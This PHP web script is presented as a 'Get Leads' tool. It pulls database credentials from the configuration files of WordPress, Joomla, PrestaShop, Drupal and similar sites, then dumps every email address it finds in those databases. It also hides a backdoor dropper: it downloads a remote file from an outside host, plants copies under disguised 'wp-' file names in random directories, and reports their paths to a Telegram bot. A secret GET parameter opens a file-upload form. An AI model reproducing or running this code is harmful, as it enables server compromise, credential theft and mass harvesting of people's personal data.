function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
ini_set('memory_limit', '-1');
echo('<body bgcolor="black">');
echo('<center><img src="https://i.pinimg.com/originals/f1/9a/33/f19a338c54cca57a0719c5ec6efae6b4.jpg" alt="imag" style="width: 100px;"><br><br><form method="POST" action=""><button name="submit" type="submit">Get Leads</button></form><br><br><br></center>');
if(isset($_POST['submit'])){
function grapper1($host,$user,$pass,$file){
    $con = mysql_connect($host,$user,$pass);
    $fp = fopen($file,'a');
    $count = 0;
    $databases = getdata("SHOW DATABASES");
    foreach($databases as $database){
        $tables = getdata("SHOW TABLES FROM $database");
        foreach($tables as $table){
            $columns = getdata("SHOW COLUMNS FROM $database.$table");
            foreach($columns as $column){
                $emails = getdata("SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");
                foreach($emails as $email){
                    if(filter_var($email, FILTER_VALIDATE_EMAIL)){
                        if(preg_match("/$email/i",file_get_contents($file))) continue;
                        $count++;
                        fwrite($fp,"$email\n");
                        if(preg_match("/employer/i",$table) or preg_match("/employeur/i",$table)){
                            $fp22=fopen("adm.txt","a");
                            fwrite($fp22,"$email\n");
                            fclose($fp22);
                        }
                    }else{
                        foreach(preg_split("/\s/",$text) as $string){
                            if(filter_var($string,FILTER_VALIDATE_EMAIL)){
                                if(preg_match("/$string/i",file_get_contents($file))) continue;
                                $count++;
                                fwrite($fp,"$string\n");
                                if(preg_match("/employer/i",$table) or preg_match("/employeur/i",$table)){
                                    $fp22=fopen("adm.txt","a");
                                    fwrite($fp22,"$string\n");
                                    fclose($fp22);
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    fclose($fp);
    mysql_close($con);
    return $count;
}
function grapper2($host,$user,$pass,$file){
$sql="SHOW DATABASES";
$link = @mysqli_connect($host,$user,$pass) or die ('Error connecting to mysql: ' . mysqli_error($link).'\r\n');
$result=@mysqli_query($link,$sql);
$fp=fopen($file,"a");
if(function_exists("chmod")){ @chmod($file,0755);}
while( $row = mysqli_fetch_row( $result ) ){
      $database=$row[0];
      $result2=@mysqli_query($link,"SHOW TABLES FROM $database");
       while( $row2 = mysqli_fetch_row( $result2 ) ){
           $table=$row2[0];
           $result3=@mysqli_query($link,"SHOW COLUMNS FROM $database.$table");
           while( $row3 = mysqli_fetch_row( $result3 ) ){
               $column=$row3[0];
               $result4=@mysqli_query($link,"SELECT $column FROM  $database.$table WHERE $column REGEXP '[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]'");             
               while( $row4 = mysqli_fetch_row( $result4 ) ){
                     $email=$row4[0];
                     if(filter_var($email, FILTER_VALIDATE_EMAIL)){
                       if(function_exists("file_get_contents")){ if(preg_match("/$email/i",file_get_contents($file))) continue; }
                        $count++;
                        fwrite($fp,"$email\n");
                        if(preg_match("/employer/i",$table) or preg_match("/employeur/i",$table)){
                            $fp22=fopen("adm.txt","a");
                            fwrite($fp22,"$email\n");
                            fclose($fp22);
                        }
                     }else{
                        foreach(preg_split("/\s/",$text) as $string){
                            if(filter_var($string,FILTER_VALIDATE_EMAIL)){
                                if(function_exists("file_get_contents")){ if(preg_match("/$string/i",file_get_contents($file))) continue; }
                                $count++;
                                fwrite($fp,"$string\n");
                                if(preg_match("/employer/i",$table) or preg_match("/employeur/i",$table)){
                                    $fp22=fopen("adm.txt","a");
                                    fwrite($fp22,"$string\n");
                                    fclose($fp22);
                                }
                            }
                        }
                    }
               }
           }
       }
    }
}
function getdata($sql){
    $q = @mysql_query($sql);
    $result = array();
    while(
        $d = @mysql_fetch_array($q)){
        $result[] = $d[0];
    }
    return $result;
}
function bajatax_co($host,$user,$pass,$file){
    if(function_exists("mysql_connect")){
        grapper1($host,$user,$pass,$file);
    }elseif(function_exists("mysqli_connect")){
        grapper2($host,$user,$pass,$file);  
    }else{
        echo "No function grappe for this site exist :/ Add this site";     
    }
}
if(isset($_GET["wp"])){
echo "wordpress <br><br>";
$url=$_GET["wp"];
$a=$_GET["a"];
$filee=@file_get_contents($url);
for($a=$a;$a<=800000;$a++){
echo $a."<br><br>";
$files=explode("\"> ",$filee);
$aa=explode("</a></li>",$files[$a]);
$ss= str_replace(array("<li><a href=\"","\n","\r","\r\n"," "), "", $aa[1]);
$web=$url."/".$ss;
echo $web."<br>";
$file=@file_get_contents($web);
if(@preg_match("/'DB_NAME', '/i",$file) or @preg_match("/'DB_USER', '/i",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'DB_HOST', '",$file);
$host=explode("');",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'DB_USER', '",$file);
$user=explode("');",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'DB_PASSWORD', '",$file);
$pass=explode("');",
$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
      bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
}}
}
if(isset($_GET["joom"])){
echo "joomla <br>";
$url=$_GET["joom"];
$a=$_GET["a"];
$filee=@file_get_contents($url);
for($a=$a;$a<=800000;$a++){
echo $a."<br><br>";
$files=explode("\"> ",$filee);
$aa=explode("</a></li>",$files[$a]);
$ss= str_replace(array("<li><a href=\"","\n","\r","\r\n"," "), "", $aa[1]);
$web=$url."/".$ss;
echo $web."<br>";
$file=@file_get_contents($web);
if(@preg_match("/class/i",$file) or @preg_match("/var/i",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("\$host = '",$file);
$host=explode("';",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("\$user = '",$file);
$user=explode("';",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("\$password = '",$file);
$pass=explode("';",$pass[1]);
$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
      bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
}}
}
if(isset($_GET["presta"])){
echo "presta <br>";
$url=$_GET["presta"];
$a=$_GET["a"];
$filee=@file_get_contents($url);
for($a=$a;$a<=800000;$a++){
echo $a."<br><br>";
$files=explode("\"> ",$filee);
$aa=explode("</a></li>",$files[$a]);
$ss= str_replace(array("<li><a href=\"","\n","\r","\r\n"," "), "", $aa[1]);
$web=$url."/".$ss;
echo $web."<br>";
$file=@file_get_contents($web);
if(@preg_match(".'_DB_SERVER_', '/i",$file) or @preg_match("/'_DB_NAME_', '/i",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'_DB_SERVER_', '",$file);
$host=explode("');",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'_DB_USER_', '",$file);
$user=explode("');",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'_DB_PASSWD_', '",$file);
$pass=explode("');",
$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
//////////////////////////////////////////////////////////////////////////
   bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
       exit();
}}
}
if (file_exists("config/settings.inc.php") or ("../config/settings.inc.php") or ("../../config/settings.inc.php") or ("../../../config/settings.inc.php") or ("../../../../config/settings.inc.php") or ("../../../../../config/settings.inc.php") or ("../../../../../../config/settings.inc.php")) {
$config=array(
"config/settings.inc.php","../config/settings.inc.php","../../config/settings.inc.php","../../../config/settings.inc.php","../../../../config/settings.inc.php","../../../../../config/settings.inc.php","../../../../../../config/settings.inc.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@preg_match("/'_DB_SERVER_', '/i",$file) or @preg_match("/'_DB_NAME_', '/i",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'_DB_SERVER_', '",$file);
$host=explode("');",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'_DB_USER_', '",$file);
$user=explode("');",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'_DB_PASSWD_', '",$file);
$pass=explode("');",
$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
//////////////////////////////////////////////////////////////////////////
   bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
       exit();
}}}
if (file_exists("app/config/parameters.php") or ("../app/config/parameters.php") or ("../../app/config/parameters.php") or ("../../../app/config/parameters.php") or ("../../../../app/config/parameters.php") or ("../../../../../app/config/parameters.php") or ("../../../../../../app/config/parameters.php")) {
$config=array(
"app/config/parameters.php","../app/config/parameters.php","../../app/config/parameters.php","../../../app/config/parameters.php","../../../../app/config/parameters.php","../../../../../app/config/parameters.php","../../../../../../app/config/parameters.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@preg_match("/database_name/i",$file) or @preg_match("/database_user/i",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("database_host' => '",$file);
$host=explode("'",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("database_user' => '",$file);
$user=explode("'",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("database_password' => '",$file);
$pass=explode("'",$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
//////////////////////////////////////////////////////////////////////////
   bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
       exit();

}}}
if (file_exists("wp-config.php") or ("../wp-config.php") or ("../../wp-config.php") or ("../../../wp-config.php") or ("../../../../wp-config.php") or ("../../../../../wp-config.php") or ("../../../../../../wp-config.php")) {
$config=array(
"wp-config.php","../wp-config.php","../../wp-config.php","../../../wp-config.php","../../../../wp-config.php","../../../../../wp-config.php","../../../../../../wp-config.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@preg_match("/'DB_NAME', '/i",$file) or @preg_match("/'DB_USER', '/i",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("'DB_HOST', '",$file);
$host=explode("'",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'DB_USER', '",$file);
$user=explode("'",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'DB_PASSWORD', '",$file);
$pass=explode("'",$pass[1]);$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
//////////////////////////////////////////////////////////////////////////
   bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
    exit();
}elseif(@preg_match("/'DB_NAME', \"/i",$file) or @preg_match("/'DB_USER', \"/i",$file) ){
$host=explode("'DB_HOST', \"",$file);
$host=explode("\"",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'DB_USER', \"",$file);
$user=explode("\"",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'DB_PASSWORD', \"",$file);
$pass=explode("\"",$pass[1]);$pass=$pass[0];    
}}}
if(file_exists("configuration.php") or ("../configuration.php") or ("../../configuration.php") or ("../../../configuration.php") or ("../../../../configuration.php" or "../../../../../configuration.php" or"../../../../../../configuration.php")) {
$config=array(
"configuration.php","../configuration.php","../../configuration.php","../../../configuration.php","../../../../configuration.php","../../../../../configuration.php","../../../../../../configuration.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@preg_match("/'mysql',/i",$file) or @preg_match("/'username',/i",$file) ){
//////////host////////////////
//////////host////////////////
$host=explode("var \$host = '",$file);
$host=explode("'",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("var \$user = '",$file);
$user=explode("'",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("var \$password = '",$file);
$pass=explode("'",$pass[1]);
$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
///////////////////////////////////:
   bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
    exit(); 
}}  
    
}
if(file_exists("sites/default/settings.php") or ("../sites/default/settings.php") or ("../../sites/default/settings.php") or ("../../../sites/default/settings.php") or ("../../../../sites/default/settings.php") or ("../../../../../sites/default/settings.php") or ("../../../../../../sites/default/settings.php")) {
$config=array(
"sites/default/settings.php","../sites/default/settings.php","../../sites/default/settings.php","../../../sites/default/settings.php","../../../../sites/default/settings.php","../../../../../sites/default/settings.php","../../../../../../sites/default/settings.php"
);
foreach($config as $wpcon){
$file=@file_get_contents($wpcon);
if(@preg_match("/'mysql',/i",$file) or @preg_match("/'username',/i",$file) ){
//////////host////////////////
//////////host////////////////
$file=explode("\$databases = array (",$file);
$host=explode("'host' => '",$file[1]);
$host=explode("'",$host[1]);
$host=$host[0];
/////////user///////////////
$user=explode("'username' => '",$file[1]);
$user=explode("'",$user[1]);
$user=$user[0];
////////password///////////
$pass=explode("'password' => '",$file[1]);
$pass=explode("'",$pass[1]);
$pass=$pass[0];
///////////////////////////////////////
echo "<center><a href='DrParad0x1999.txt'>Click Here</a><br>";
///////////////////////////////////:
   bajatax_co($host,$user,$pass,"DrParad0x1999.txt");
    exit(); 
}}
}
else {
echo "i dontknow :/ \n\n";
}
}

session_start();
if(!$_SESSION['logdsx']){
$ban_folder=array('','');
$check3 = $_SERVER['DOCUMENT_ROOT'];
$zz=scandir($check3);
function random_name($a){
	$string=str_split("azertyuiopqsdfghjklmwxcvbn");
	$s="";
	for($i=0;$i<=$a;$i++){
		$s.=$string[rand(0,count($string)-1)];
	}
	return "/wp-".$s.".php";
}
$check4=array();
$check4[]=$_SERVER['DOCUMENT_ROOT'];
$i2=0;
for($i=0;$i<=count($check4);$i++){
	$z=scandir($check4[$i]);
	$z=array_diff($z, array('.', '..'));
	foreach($z as $b){
	  // if(in_array($b,$ban_folder)) continue;
      if(is_dir($check4[$i].'/'.$b)){$check4[]=$check4[$i].'/'.$b;}
	}
	if($i2>=50) break;
	$i2+=1;
}
$text3 = http_get('https://deltastore.cc/Sl33perFiles/sl33per.txt');
if(count($check4)>0){
$finalpath=array();
$finalpathfiles=array();
$bilmsg="";
$i=0;
do{

	   $path=$check4[rand(0,count($check4)-1)];
	   if(!in_array($path,$finalpath) and $path !=$_SERVER['DOCUMENT_ROOT'] and $path != __DIR__){
		$save=$path . random_name(4);
		$finalpathfiles[]=$save;
		$bilmsg.="Link : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\nPath :  ".$save. "\r\n";
		$finalpath[]=$path;
		$open3 = fopen($save, 'w');
		fwrite($open3, $text3);
		fclose($open3);	
	   }
$_SESSION['logdsx']=True;
}while(count($finalpathfiles)<3);
}
	$zbi=array('5107167294');
    foreach($zbi as $user_id) {
     $website="https://api.telegram.org/bot5436657587:AAE-UvklTV26w6gQURCKXVnjsuJvp5FEImE";
     $params=[
      'chat_id'=>$user_id, 
      'text'=>$bilmsg,
     ];
     $ch = curl_init($website . '/sendMessage');
     curl_setopt($ch, CURLOPT_HEADER, false);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     $result = curl_exec($ch);
	curl_close($ch);}
}
$message  = $_GET['DrParad0x1999'];
if($message == '0x1999'){
$xx = $_FILES['file']['name'];
$yy  = $_FILES['file']['tmp_name'];
echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='upload' />
</form>";
move_uploaded_file($yy,$xx); 
}
